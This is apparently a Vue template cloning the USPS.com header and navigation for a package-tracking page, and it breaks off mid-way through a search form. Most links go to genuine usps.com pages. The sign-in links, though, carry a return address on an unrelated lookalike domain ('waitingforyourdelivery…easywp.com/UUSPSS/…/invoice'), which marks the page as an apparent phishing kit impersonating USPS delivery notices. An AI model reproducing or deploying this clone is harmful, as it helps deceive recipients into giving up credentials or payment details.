<template>
  <div id="tracking_page_wrapper">
    <div class="nav-utility" id="nav-utility">
      <div class="utility-links" id="utility-header">
        <div class="lang-select">
          <a id="link-lang" href="#">
            <span class="visuallyhidden">Current language:</span>
            English
          </a>
          <ul class="lang-list">
            <li class="lang-option">
              <a>English</a>
            </li>
          </ul>
        </div>
        <a id="link-locator" href="#">Locations</a>
        <a id="link-customer" href="#">Support</a>
        <a id="link-myusps" href="#">Informed Delivery</a>
        <a
          id="login-register-header"
          class="link-reg"
          href="https://reg.usps.com/entreg/LoginAction_input?app=UspsTools&amp;appURL=https://waitingforyourdelivery-917c99.ingress-earth.easywp.com/UUSPSS/Support/help/request/9514901185421/user/invoice/"
          >Register / Sign In</a
        >
        <div id="link-cart" style="display: inline-block"></div>
      </div>
    </div>
    <div class="global--navigation" id="g-navigation">
      <a
        tabindex="-1"
        name="skipallnav"
        id="skipallnav"
        href="#endnav"
        class="hidden-skip"
        >Skip all category navigation links</a
      >
      <div class="nav-full">
        <a
          class="global-logo"
          href="https://www.usps.com/"
          style="vertical-align: baseline"
        >
          <img
            src="https://www.usps.com/global-elements/header/images/utility-header/logo-sb.svg"
            alt="Image of USPS.com logo."
            aria-label="Image of USPS.com logo."
          />
        </a>
        <div class="mobile-header">
          <a class="mobile-hamburger" href="#"
            ><img
              src="https://www.usps.com/assets/images/home/hamburger.svg"
              alt="hamburger menu Icon"
          /></a>
          <a class="mobile-logo" href="https://www.usps.com/"
            ><img
              src="https://www.usps.com/assets/images/home/logo_mobile.svg"
              alt="USPS mobile logo"
          /></a>
          <a class="mobile-search" href="#"
            ><img
              src="https://www.usps.com/assets/images/home/search.svg"
              alt="Search Icon"
          /></a>
        </div>

        <nav>
          <div class="mobile-log-state">
            <div id="msign" class="mobile-utility">
              <div class="mobile-sign">
                <a
                  href="https://reg.usps.com/entreg/LoginAction_input?app=UspsTools&amp;appURL=https://waitingforyourdelivery-917c99.ingress-earth.easywp.com/UUSPSS/Support/help/request/9514901185421/user/invoice/"
                  >Sign In</a
                >
              </div>
            </div>
          </div>
          <ul class="nav-list" role="menubar">
            <li class="qt-nav menuheader">
              <a
                tabindex="-1"
                name="navquicktools"
                id="navquicktools"
                href="#navmailship"
                class="hidden-skip"
                >Skip Quick Tools Links</a
              >
              <a
                aria-expanded="false"
                role="menuitem"
                tabindex="0"
                aria-haspopup="true"
                class="nav-first-element menuitem"
                href="#"
                >Quick Tools</a
              >
              <div class="">
                <ul role="menu" aria-hidden="true">
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://tools.usps.com/go/TrackConfirmAction_input"
                    >
                      <img
                        src="https://www.usps.com/assets/images/home/tracking.svg"
                        alt="Tracking Icon"
                      />
                      <p>Track a Package</p>
                    </a>
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://informeddelivery.usps.com/"
                    >
                      <img
                        src="https://www.usps.com/global-elements/header/images/utility-header/mailman.svg"
                        alt="Informed Delivery Icon"
                      />
                      <p>Informed Delivery</p>
                    </a>
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://tools.usps.com/find-location.htm"
                    >
                      <img
                        src="https://www.usps.com/assets/images/home/location.svg"
                        alt="Post Office Locator Icon"
                      />
                      <p>Find USPS Locations</p>
                    </a>
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://store.usps.com/store/browse/category.jsp?categoryId=buy-stamps"
                    >
                      <img
                        src="https://www.usps.com/assets/images/home/stamps.svg"
                        alt="Stamps Icon"
                      />
                      <p>Buy Stamps</p>
                    </a>
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://tools.usps.com/schedule-pickup-steps.htm"
                    >
                      <img
                        src="https://www.usps.com/assets/images/home/schedule_pickup.svg"
                        alt="Schedule a Pickup Icon"
                      />
                      <p>Schedule a Pickup</p>
                    </a>
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://postcalc.usps.com/"
                    >
                      <img
                        src="https://www.usps.com/assets/images/home/calculate_price.svg"
                        alt="Calculate a Price Icon"
                      />
                      <p>Calculate a Price</p>
                    </a>
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://tools.usps.com/go/ZipLookupAction_input"
                    >
                      <img
                        src="https://www.usps.com/assets/images/home/find_zip.svg"
                        alt="Zip Code™ Lookup Icon"
                      />
                      <p>Look Up a <br />ZIP Code<sup>™</sup></p>
                    </a>
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://holdmail.usps.com/holdmail/"
                    >
                      <img
                        src="https://www.usps.com/assets/images/home/holdmail.svg"
                        alt="Holdmail Icon"
                      />
                      <p>Hold Mail</p>
                    </a>
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://moversguide.usps.com/?referral=MG82"
                    >
                      <img
                        src="https://www.usps.com/assets/images/home/change_address.svg"
                        alt="Change of Address Icon"
                      />
                      <p>Change My Address</p>
                    </a>
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/manage/po-boxes.htm"
                    >
                      <img
                        src="https://www.usps.com/assets/images/home/po_box.svg"
                        alt="Post Office Boxes Icon"
                      />
                      <p>Rent/Renew a <br />PO Box</p>
                    </a>
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://store.usps.com/store/browse/category.jsp?categoryId=shipping-supplies"
                    >
                      <img
                        src="https://www.usps.com/assets/images/home/free_boxes.svg"
                        alt="Shipping Supplies Icon"
                      />
                      <p>Free Boxes</p>
                    </a>
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://cns.usps.com/"
                    >
                      <img
                        src="https://www.usps.com/assets/images/home/featured_clicknship.svg"
                        alt="Click-N-Ship Icon"
                      />
                      <p>Click-N-Ship</p>
                    </a>
                  </li>
                </ul>
              </div>
            </li>
            <li class="menuheader">
              <a
                tabindex="-1"
                name="navmailship"
                id="navmailship"
                href="#navtrackmanage"
                class="hidden-skip"
                >Skip Mail and Ship Links</a
              >
              <a
                id="mail-ship-width"
                aria-expanded="false"
                class="menuitem"
                role="menuitem"
                tabindex="0"
                aria-haspopup="true"
                href="https://www.usps.com/ship/"
                >Mail &amp; Ship</a
              >
              <div class="repos">
                <ul role="menu" aria-hidden="true" class="tools">
                  <h3>Tools</h3>
                  <li class="tool-cns">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://cns.usps.com/"
                      >Click-N-Ship</a
                    >
                  </li>
                  <li class="tool-stamps">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://store.usps.com/store/"
                      >Stamps &amp; Supplies</a
                    >
                  </li>
                  <li class="tool-calc">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://postcalc.usps.com/"
                      >Calculate a Price</a
                    >
                  </li>
                  <li class="tool-pick">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://tools.usps.com/schedule-pickup-steps.htm"
                      >Schedule a Pickup</a
                    >
                  </li>
                  <li class="tool-zip">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://tools.usps.com/go/ZipLookupAction_input"
                      >Look Up a ZIP Code<sup>™</sup></a
                    >
                  </li>
                  <li class="tool-find">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://tools.usps.com/find-location.htm"
                      >Find a USPS Location</a
                    >
                  </li>
                </ul>
                <ul role="menu" aria-hidden="true">
                  <h3>Learn About</h3>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/ship/"
                      >Mailing &amp; Shipping</a
                    >
                  </li>
                  <ul aria-hidden="true">
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/ship/letters.htm"
                        >Sending Mail</a
                      >
                    </li>
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/ship/packages.htm"
                        >Sending Packages</a
                      >
                    </li>
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/ship/insurance-extra-services.htm"
                        >Insurance &amp; Extra Services</a
                      >
                    </li>
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/ship/shipping-restrictions.htm"
                        >Shipping Restrictions</a
                      >
                    </li>
                  </ul>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/ship/online-shipping.htm"
                      >Online Shipping</a
                    >
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/business/label-broker.htm"
                      >Label Broker</a
                    >
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/ship/custom-mail.htm"
                      >Custom Mail, Cards, &amp; Envelopes</a
                    >
                  </li>
                </ul>
                <ul role="menu" aria-hidden="true">
                  <h3 class="desktop-only">&nbsp;</h3>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/ship/mail-shipping-services.htm"
                      >Mail &amp; Shipping Services</a
                    >
                  </li>
                  <ul aria-hidden="true">
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/ship/priority-mail-express.htm"
                        >Priority Mail Express</a
                      >
                    </li>
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/ship/priority-mail.htm"
                        >Priority Mail</a
                      >
                    </li>
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/ship/first-class-mail.htm"
                        >First-Class Mail</a
                      >
                    </li>
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/ship/apo-fpo-dpo.htm"
                        >Military &amp; Diplomatic Mail</a
                      >
                    </li>
                  </ul>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/shop/money-orders.htm"
                      >Money Orders</a
                    >
                  </li>
                  <div class="desktop-only mailship-addition">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/ship/go-now.htm"
                      ><img
                        src="https://www.usps.com/ship/go-now.png"
                        alt=" "
                      /><span class="visuallyhidden"
                        >Print and ship from home. Start Click-N-Ship.</span
                      ><span class="visuallyhidden"
                        >Print and ship from home. Start Click-N-Ship.</span
                      ></a
                    >
                  </div>
                </ul>
                <form
                  method="get"
                  class="search global-header--search"
                  tabindex="-1"
                  action="https://www.usps.com/search"
                >
                  <span aria-hidden="false" tabindex="-1" class="input--wrap">
                    <label
                      tabindex="-1"
                      class="visuallyhidden"
                      for="global-header--search-track-mail-ship"
                      >Search USPS.com</label
                    >
                    <input
                      tabindex="-1"
                      autocomplete="off"
                      placeholder="Search or Enter a Tracking Number"
                      class="search--track-input input--field q global-header--search-track"
                      id="global-header--search-track-mail-ship"
                      maxlength="256"
                      name="q"
                      type="text"
                    />
                    <div class="autocorrect"><ul aria-hidden="true"></ul></div>
                    <input
                      tabindex="-1"
                      value="Search"
                      class="input--search search--submit"
                      type="submit"
                    />
                  </span>
                </form>
              </div>
            </li>
            <li class="menuheader">
              <a
                tabindex="-1"
                name="navtrackmanage"
                id="navtrackmanage"
                href="#navpostalstore"
                class="hidden-skip"
                >Skip Track and Manage Links</a
              >
              <a
                aria-expanded="false"
                class="menuitem"
                role="menuitem"
                tabindex="0"
                aria-haspopup="true"
                href="https://www.usps.com/manage/"
                >Track &amp; Manage</a
              >
              <div>
                <ul role="menu" aria-hidden="true" class="tools">
                  <h3>Tools</h3>
                  <li class="tool-track">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://tools.usps.com/go/TrackConfirmAction_input"
                      >Tracking</a
                    >
                  </li>
                  <li class="tool-informed">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://informeddelivery.usps.com"
                      >Informed Delivery</a
                    >
                  </li>
                  <li class="tool-intercept">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://retail-pi.usps.com/retailpi/actions/index.action"
                      >Intercept a Package</a
                    >
                  </li>
                  <li class="tool-redelivery">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://tools.usps.com/redelivery.htm"
                      >Schedule a Redelivery</a
                    >
                  </li>
                  <li class="tool-hold">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://holdmail.usps.com/holdmail/"
                      >Hold Mail</a
                    >
                  </li>
                  <li class="tool-change">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://moversguide.usps.com/?referral=MG80"
                      >Change of Address</a
                    >
                  </li>
                  <li class="tool-pobol">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/manage/po-boxes.htm"
                      >Rent or Renew PO Box</a
                    >
                  </li>
                </ul>
                <ul role="menu" aria-hidden="true">
                  <h3>Learn About</h3>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/manage/"
                      >Managing Mail Basics</a
                    >
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/manage/forward.htm"
                      >Forwarding Mail</a
                    >
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://informeddelivery.usps.com/"
                      >Informed Delivery</a
                    >
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/manage/package-intercept.htm"
                      >Redirecting a Package</a
                    >
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/manage/po-boxes.htm"
                      >PO Boxes</a
                    >
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/manage/mailboxes.htm"
                      >Mailbox Guidelines</a
                    >
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/manage/mail-for-deceased.htm"
                      >Mail for the Deceased</a
                    >
                  </li>
                  <div class="desktop-only manage-addition">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/manage/go-now.htm"
                      ><img
                        src="https://www.usps.com/manage/go-now.png"
                        alt=" "
                    /></a>
                  </div>
                </ul>
                <form
                  tabindex="-1"
                  role="search"
                  method="get"
                  class="search global-header--search track-manage"
                  action="https://www.usps.com/search"
                >
                  <span tabindex="-1" aria-hidden="false" class="input--wrap">
                    <label
                      tabindex="-1"
                      class="visuallyhidden"
                      for="global-header--search-track-track-manage"
                      >Search USPS.com</label
                    >
                    <input
                      tabindex="-1"
                      autocomplete="off"
                      placeholder="Search or Enter a Tracking Number"
                      class="search--track-input input--field q global-header--search-track"
                      id="global-header--search-track-track-manage"
                      maxlength="256"
                      name="q"
                      type="text"
                    />
                    <div class="autocorrect"><ul aria-hidden="true"></ul></div>
                    <input
                      tabindex="-1"
                      value="Search"
                      class="input--search search--submit"
                      type="submit"
                    />
                  </span>
                </form>
              </div>
            </li>
            <li class="menuheader">
              <a
                tabindex="-1"
                name="navpostalstore"
                id="navpostalstore"
                href="#navbusiness"
                class="hidden-skip"
                >Skip Postal Store Links</a
              >
              <a
                aria-expanded="false"
                class="menuitem"
                role="menuitem"
                tabindex="0"
                aria-haspopup="true"
                href="https://store.usps.com/store"
                >Postal Store</a
              >
              <div class="repos">
                <ul role="menu" aria-hidden="true" class="tools">
                  <h3>Shop</h3>

                  <li class="tool-stamps">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://store.usps.com/store/browse/category.jsp?categoryId=buy-stamps"
                      >Stamps</a
                    >
                  </li>
                  <li class="tool-supplies">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://store.usps.com/store/browse/category.jsp?categoryId=shipping-supplies"
                      >Shipping Supplies</a
                    >
                  </li>
                  <li class="tool-cards">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://store.usps.com/store/browse/category.jsp?categoryId=cards-envelopes"
                      >Cards &amp; Envelopes</a
                    >
                  </li>
                  <li class="tool-pse">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://store.usps.com/store/pse/"
                      >Personalized Stamped Envelopes</a
                    >
                  </li>
                  <li class="tool-coll">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://store.usps.com/store/browse/category.jsp?categoryId=stamp-collectors"
                      >Collectors</a
                    >
                  </li>
                  <li class="tool-gifts">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://store.usps.com/store/browse/category.jsp?categoryId=stamp-gifts"
                      >Gifts</a
                    >
                  </li>
                  <li class="tool-business">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://store.usps.com/store/results/business/_/N-1y2576k"
                      >Business Supplies</a
                    >
                  </li>
                </ul>

                <ul role="menu" aria-hidden="true">
                  <h3>Learn About</h3>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/shop/money-orders.htm"
                      >Money Orders</a
                    >
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/shop/returns-exchanges.htm"
                      >Returns &amp; Exchanges</a
                    >
                  </li>
                  <div class="desktop-only shop-addition">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/store/go-now.htm"
                      ><img
                        src="https://www.usps.com/store/go-now.png"
                        alt=" "
                      /><span class="visuallyhidden"
                        >Shop Forever Stamps. Shop now.</span
                      ><span class="visuallyhidden"
                        >Shop Forever Stamps. Shop now.</span
                      ></a
                    >
                  </div>
                </ul>
                <form
                  tabindex="-1"
                  role="search"
                  method="get"
                  class="search global-header--search"
                  action="https://www.usps.com/search"
                >
                  <span tabindex="-1" aria-hidden="false" class="input--wrap">
                    <label
                      class="visuallyhidden"
                      tabindex="-1"
                      for="global-header--search-track-store"
                      >Search the Postal Store: Keyword or SKU</label
                    >
                    <input
                      tabindex="-1"
                      autocomplete="off"
                      placeholder="Search the Postal Store: Keyword or SKU"
                      class="search--track-input input--field q global-header--search-track"
                      id="global-header--search-track-store"
                      maxlength="256"
                      name="q"
                      type="text"
                    />
                    <div class="autocorrect"><ul aria-hidden="true"></ul></div>
                    <input
                      tabindex="-1"
                      value="Search"
                      class="input--search search--submit"
                      type="submit"
                    />
                  </span>
                </form>
              </div>
            </li>
            <li class="menuheader">
              <a
                tabindex="-1"
                name="navbusiness"
                id="navbusiness"
                href="#navinternational"
                class="hidden-skip"
                >Skip Business Links</a
              >
              <a
                aria-expanded="false"
                class="menuitem"
                tabindex="0"
                aria-haspopup="true"
                role="menuitem"
                href="https://www.usps.com/business/"
                >Business</a
              >
              <div class="repos">
                <ul role="menu" aria-hidden="true" class="tools">
                  <h3>Tools</h3>
                  <li class="tool-calc">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://dbcalc.usps.com/"
                      >Calculate a Business Price</a
                    >
                  </li>
                  <li class="tool-eddm">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://eddm.usps.com/eddm/customer/routeSearch.action"
                      >Every Door Direct Mail</a
                    >
                  </li>
                  <div class="desktop-only business-addition">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/business/go-now.htm"
                      ><img
                        src="https://www.usps.com/business/go-now.png"
                        alt=" "
                      /><span class="visuallyhidden"
                        >Grow your business with Every Door Direct Mail. Try
                        EDDM now.</span
                      ><span class="visuallyhidden"
                        >Grow your business with Every Door Direct Mail. Try
                        EDDM now.</span
                      ></a
                    >
                  </div>
                </ul>

                <ul role="menu" aria-hidden="true">
                  <h3>Learn About</h3>

                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/business/business-shipping.htm"
                      >Shipping for Business</a
                    >
                  </li>
                  <ul aria-hidden="true">
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/business/shipping-consolidators.htm"
                        >Shipping Consolidators</a
                      >
                    </li>
                  </ul>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/business/advertise-with-mail.htm"
                      >Advertising with Mail</a
                    >
                  </li>
                  <ul aria-hidden="true">
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/business/every-door-direct-mail.htm"
                        >Using EDDM</a
                      >
                    </li>
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/business/vendors.htm"
                        >Mailing &amp; Printing Services</a
                      >
                    </li>
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/business/customized-direct-mail.htm"
                        >Customized Direct Mail</a
                      >
                    </li>
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/business/political-mail.htm"
                        >Political Mail</a
                      >
                    </li>
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/business/promotions-incentives.htm"
                        >Promotions &amp; Incentives</a
                      >
                    </li>
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/business/informed-delivery.htm"
                        >Informed Delivery Marketing</a
                      >
                    </li>
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/business/product-samples.htm"
                        >Product Samples</a
                      >
                    </li>
                  </ul>
                </ul>
                <ul role="menu" aria-hidden="true">
                  <h3 class="desktop-only">&nbsp;</h3>

                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/business/postage-options.htm"
                      >Postage Options</a
                    >
                  </li>
                  <ul aria-hidden="true">
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/business/verify-postage.htm"
                        >Verifying Postage</a
                      >
                    </li>
                  </ul>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/business/return-services.htm"
                      >Returns Services</a
                    >
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/business/label-broker.htm"
                      >Label Broker</a
                    >
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/business/international-shipping.htm"
                      >International Business Shipping</a
                    >
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/business/manage-mail.htm"
                      >Managing Business Mail</a
                    >
                  </li>

                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/business/web-tools-apis/"
                      >Web Tools (APIs)</a
                    >
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/business/prices.htm"
                      >Prices</a
                    >
                  </li>
                </ul>
                <form
                  tabindex="-1"
                  role="search"
                  method="get"
                  class="search global-header--search business-bottom"
                  action="https://www.usps.com/search"
                >
                  <span tabindex="-1" aria-hidden="false" class="input--wrap">
                    <label
                      tabindex="-1"
                      class="visuallyhidden"
                      for="global-header--search-track-business"
                      >Search USPS.com</label
                    >
                    <input
                      tabindex="-1"
                      autocomplete="off"
                      placeholder="Search or Enter a Tracking Number"
                      class="search--track-input input--field q global-header--search-track"
                      id="global-header--search-track-business"
                      maxlength="256"
                      name="q"
                      type="text"
                    />
                    <div class="autocorrect"><ul aria-hidden="true"></ul></div>
                    <input
                      tabindex="-1"
                      value="Search"
                      class="input--search search--submit"
                      type="submit"
                    />
                  </span>
                </form>
              </div>
            </li>
            <li class="menuheader">
              <a
                tabindex="-1"
                name="navinternational"
                id="navinternational"
                href="#navhelp"
                class="hidden-skip"
                >Skip International Links</a
              >
              <a
                class="menuitem"
                tabindex="0"
                aria-expanded="false"
                aria-haspopup="true"
                role="menuitem"
                href="https://www.usps.com/international/"
                >International</a
              >
              <div class="repos">
                <ul role="menu" aria-hidden="true" class="tools">
                  <h3>Tools</h3>

                  <li class="tool-calc">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://ircalc.usps.com/"
                      >Calculate International Prices</a
                    >
                  </li>
                  <li class="tool-international-labels">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://cns.usps.com/"
                      >Print International Labels</a
                    >
                  </li>
                  <div class="desktop-only international-addition">
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/international/go-now.htm"
                      ><img
                        src="https://www.usps.com/international/go-now.png"
                        alt=" "
                      /><span class="visuallyhidden"
                        >Use our online scheduler to make a passport
                        appointment. Schedule Today.</span
                      ><span class="visuallyhidden"
                        >Use our online scheduler to make a passport
                        appointment. Schedule Today.</span
                      ></a
                    >
                  </div>
                </ul>

                <ul role="menu" aria-hidden="true">
                  <h3>Learn About</h3>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/international/international-how-to.htm"
                      >Printing &amp; Shipping International</a
                    >
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/international/mail-shipping-services.htm"
                      >International Mail Services</a
                    >
                  </li>
                  <ul aria-hidden="true">
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/international/gxg.htm"
                        >Global Express Guaranteed</a
                      >
                    </li>
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/international/priority-mail-express-international.htm"
                        >Priority Mail Express International</a
                      >
                    </li>
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/international/priority-mail-international.htm"
                        >Priority Mail International</a
                      >
                    </li>
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/international/first-class-mail-international.htm"
                        >First-Class Mail International</a
                      >
                    </li>
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/international/insurance-extra-services.htm"
                        >International Insurance &amp; Extra Services</a
                      >
                    </li>
                  </ul>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/international/preparing-international-shipments.htm"
                      >Sending International Shipments</a
                    >
                  </li>
                  <ul aria-hidden="true">
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/international/shipping-restrictions.htm"
                        >Shipping Restrictions</a
                      >
                    </li>
                  </ul>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/international/customs-forms.htm"
                      >Completing Customs Forms</a
                    >
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/ship/apo-fpo-dpo.htm?pov=international"
                      >Military &amp; Diplomatic Mail</a
                    >
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/international/money-transfers.htm"
                      >Sending Money Abroad</a
                    >
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/international/passports.htm"
                      >Passports</a
                    >
                  </li>
                </ul>
                <form
                  tabindex="-1"
                  role="search"
                  method="get"
                  class="search global-header--search"
                  action="https://www.usps.com/search"
                >
                  <span tabindex="-1" aria-hidden="false" class="input--wrap">
                    <label
                      tabindex="-1"
                      class="visuallyhidden"
                      for="global-header--search-track-international"
                      >Search USPS.com</label
                    >
                    <input
                      tabindex="-1"
                      autocomplete="off"
                      placeholder="Search or Enter a Tracking Number"
                      class="search--track-input input--field q global-header--search-track"
                      id="global-header--search-track-international"
                      maxlength="256"
                      name="q"
                      type="text"
                    />
                    <div class="autocorrect"><ul aria-hidden="true"></ul></div>
                    <input
                      tabindex="-1"
                      value="Search"
                      class="input--search search--submit"
                      type="submit"
                    />
                  </span>
                </form>
              </div>
            </li>
            <li class="menuheader">
              <a
                tabindex="-1"
                name="navhelp"
                id="navhelp"
                href="#navsearch"
                class="hidden-skip"
                >Skip Help Links</a
              >
              <a
                aria-expanded="false"
                class="menuitem"
                tabindex="0"
                aria-haspopup="true"
                role="menuitem"
                href="https://faq.usps.com/s/"
                >Help</a
              >
              <div class="repos">
                <ul role="menu" aria-hidden="true">
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://faq.usps.com/s/"
                      >FAQs</a
                    >
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/help/missing-mail.htm"
                      >Finding Missing Mail</a
                    >
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/help/claims.htm"
                      >Filing a Claim</a
                    >
                  </li>
                  <li>
                    <a
                      role="menuitem"
                      tabindex="-1"
                      href="https://www.usps.com/help/refunds.htm"
                      >Requesting a Refund</a
                    >
                  </li>
                </ul>
              </div>
            </li>
            <li class="nav-search menuheader">
              <a
                tabindex="-1"
                name="navsearch"
                id="navsearch"
                href="#endnav"
                class="hidden-skip"
                >Skip Search</a
              >
              <a
                aria-expanded="false"
                class="menuitem"
                tabindex="0"
                aria-haspopup="true"
                role="menuitem"
                href="#"
                >Search USPS.com</a
              >
              <div class="repos">
                <!-- Search -->
                <span aria-hidden="false" class="input--wrap-label">
                  <label
                    class="visuallyhidden"
                    for="styleguide-header--search-track"
                    >Search USPS.com</label
                  >
                </span>

                <form
                  tabindex="-1"
                  role="search"
                  method="get"
                  class="search global-header--search"
                  action="https://www.usps.com/search/results.htm?PNO=1&amp;keyword="
                >
                  <span tabindex="-1" aria-hidden="false" class="input--wrap">
                    <label
                      tabindex="-1"
                      class="visuallyhidden"
                      for="global-header--search-track-search"
                      >Search USPS.com</label
                    >
                    <input
                      tabindex="-1"
                      autocomplete="off"
                      placeholder="Search or Enter a Tracking Number"
